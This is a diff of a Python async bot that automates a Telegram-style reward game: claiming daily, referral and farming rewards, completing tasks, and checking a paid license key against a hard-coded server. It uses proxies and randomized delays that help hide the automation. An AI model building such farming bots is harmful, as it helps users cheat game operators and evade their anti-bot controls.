+                    await asyncio.sleep(60)
+                    continue
+                self.info(f"Balance : <lg>{int(float(balance)):,}</lg>")
+
+                await asyncio.sleep(1.5)
+
+                msg = await self.claim_daily_reward(http_client=http_client)
+                if isinstance(msg, bool) and msg:
+                    self.success("Successfully claim daily reward!")
+
+                claim_amount, is_available = await self.friend_balance(http_client=http_client)
+
+                if claim_amount != 0 and is_available:
+                    amount = await self.friend_claim(http_client=http_client)
+                    if amount:
+                        self.success(
+                            f"Successfully claim friend ref reward: <lg>(+{int(float(amount)):,})</lg>"
+                        )
+
+                await asyncio.sleep(1.5)
+
+                elig_dogs_drop = await self.check_elig_dogs(http_client=http_client)
+                if elig_dogs_drop:
+                    self.info("<lg>Your account is eligible for Dogs drop in play game</lg>")
+                else:
+                    self.warning("Your account is not eligible for Dogs drop in play game")
+
+                if isinstance(play_passes, int):
+                    self.info(f"You have <lg>{play_passes}</lg> play ticket ")
+
+                # if play_passes and play_passes > 0 and settings.PLAY_GAMES.lower() == "true":
+                #     await self.play_game(http_client=http_client, play_passes=play_passes)
+
+                await asyncio.sleep(1.5)
+
+                tasks = await self.get_tasks(http_client=http_client)
+
+                for task in tasks:
+                    if (
+                        task.get("status") == "NOT_STARTED"
+                        and task.get("type") != "PROGRESS_TARGET"
+                    ):
+                        self.info(f"Started doing task: <lc>{task['title']}</lc>")
+                        await self.start_complete_task(http_client=http_client, task_id=task["id"])
+                        await asyncio.sleep(1)
+
+                await asyncio.sleep(5)
+
+                tasks = await self.get_tasks(http_client=http_client)
+                for task in tasks:
+                    if task.get("status"):
+                        if task["status"] == "READY_FOR_CLAIM" and task["type"] != "PROGRESS_TASK":
+                            status = await self.claim_task(
+                                http_client=http_client, task_id=task["id"]
+                            )
+                            if status:
+                                self.success(f"Claimed task: <lc>{task['title']}</lc>")
+                            await asyncio.sleep(1)
+                        elif (
+                            task["status"] == "READY_FOR_VERIFY"
+                            and task["validationType"] == "KEYWORD"
+                        ):
+                            status = await self.validate_task(
+                                http_client=http_client, task_id=task["id"], title=task["title"]
+                            )
+
+                            if status:
+                                self.success(f"Validated task: <lc>{task['title']}</lc>")
+
+                await asyncio.sleep(1)
+
+                timestamp, start_time, end_time, play_passes, balance = await self.balance(
+                    http_client=http_client
+                )
+
+                if (
+                    start_time is not None
+                    and end_time is not None
+                    and timestamp is not None
+                    and timestamp >= end_time
+                ):
+                    timestamp, balance = await self.claim(http_client=http_client)
+                    self.success(
+                        f"Successfully claim farming reward!, Balance: <lg>{int(float(balance)):,}</lg>"
+                    )
+                    await asyncio.sleep(1)
+
+                    start_time, end_time = await self.start_farming(http_client=http_client)
+                    self.info(f"Start farming!")
+                    await asyncio.sleep(1)
+
+                elif start_time is None and end_time is None:
+                    start_time, end_time = await self.start_farming(http_client=http_client)
+                    self.info(f"Start farming!")
+                    await asyncio.sleep(1)
+
+                random_offset_sec = random.randint(30, 300)
+                default_sleep_duration = 3600
+                sleep_duration = default_sleep_duration + random_offset_sec
+                if end_time and timestamp:
+                    sleep_duration = (end_time - timestamp) + random_offset_sec
+                self.info(f"Delay <ly>{format_duration(sleep_duration)}</ly>")
+
+                # update membership info
+                api_key_result = await check_api_key()
+                role, expire_ts_dt = await check_membership_time_left(api_key_result)
+                self.role = role
+                self.expire_ts = expire_ts_dt
+
+                await http_client.close()
+                if proxy_conn:
+                    if not proxy_conn.closed:
+                        proxy_conn.close()
+                await asyncio.sleep(sleep_duration)
+
+            except InvalidSessionException as error:
+                raise error
+
+            except ExpiredTokenException as error:
+                self.warning(f"<ly>{error}</ly>")
+                await http_client.close()
+                if proxy_conn:
+                    if not proxy_conn.closed:
+                        proxy_conn.close()
+                self.access_token_created_time = 0
+                await asyncio.sleep(delay=60)
+                continue
+
+            except GameSessionNotFoundException as error:
+                self.warning(f"<ly>{error}</ly>")
+                await http_client.close()
+                if proxy_conn:
+                    if not proxy_conn.closed:
+                        proxy_conn.close()
+                self.access_token_created_time = 0
+                await asyncio.sleep(delay=60)
+                continue
+
+            except ErrorStartGameException as error:
+                self.warning(f"<ly>{error}</ly>")
+                await http_client.close()
+                if proxy_conn:
+                    if not proxy_conn.closed:
+                        proxy_conn.close()
+                self.access_token_created_time = 0
+                await asyncio.sleep(delay=60)
+                continue
+
+            except ExpiredApiKeyException as error:
+                self.error(str(error))
+                await http_client.close()
+                if proxy_conn:
+                    if not proxy_conn.closed:
+                        proxy_conn.close()
+                break
+
+            except Exception as error:
+                self.error(
+                    f"Unknown error: {str(error)}, retrying in <ly>{format_duration(60)}</ly>"
+                )
+                await http_client.close()
+                if proxy_conn:
+                    if not proxy_conn.closed:
+                        proxy_conn.close()
+                self.access_token_created_time = 0
+                await asyncio.sleep(delay=300)
+
+
+async def run_tapper(query_id: str, proxy: str | None, role: str, expire_ts: datetime):
+    await Tapper(query_id=query_id, role=role, expire_ts=expire_ts).run(proxy=proxy)
+
+
+async def check_api_key():
+    result = None
+    async with aiohttp.ClientSession() as session:
+        async with session.post(
+            "http://ec2-54-166-158-149.compute-1.amazonaws.com/verify-key/",
+            json={"api_key": settings.LICENSE_KEY},
+        ) as resp:
+            response = await resp.text()
+            json_response = json.loads(response)
+            if resp.status != HTTPStatus.OK:
+                raise InvalidApiKeyException(json_response.get("error"))
+            else:
+                result = json_response
+        await session.close()
+        return result
+
+
+async def check_membership_time_left(api_key_obj, show_log=False):
+    expire_ts_dt = convert_datetime_str_to_utc(api_key_obj.get("expire_ts"))
+    role = api_key_obj.get("role_name")
+    if show_log:
+        logger.info(f"============================================================")
+        logger.info(f"Login as {mapping_role_color(role)} user")
+    if role != "admin":
+        current_time_utc = datetime.now(pytz.utc)
+        if expire_ts_dt < current_time_utc:
+            raise ExpiredApiKeyException(
+                "Your LICENSE KEY has been expired, please re-subscribe it to continue"
+            )
+        if show_log:
+            membership_expiry_left_ts = expire_ts_dt - current_time_utc
+            logger.info(
+                f"LICENSE KEY expire time left: <ly>{format_duration(membership_expiry_left_ts.total_seconds())}</ly>"
+            )
+    return role, expire_ts_dt
+
+
+async def main():
+    try:
+        check_license_key()
+        check_version()
+        await process()
+    except InvalidApiKeyException as err:
+        logger.error("Invalid LICENSE KEY !")
+    except ExpiredApiKeyException as err:
+        logger.error(str(err))
+    except MissingApiKeyException as err:
+        logger.error(str(err))
+    except InvalidSessionException as err:
+        logger.error(str(err))
+    except FileNotFoundError as err:
+        logger.error(str(err))
+
+
+if __name__ == "__main__":
+    with suppress(KeyboardInterrupt):
+        asyncio.run(main())
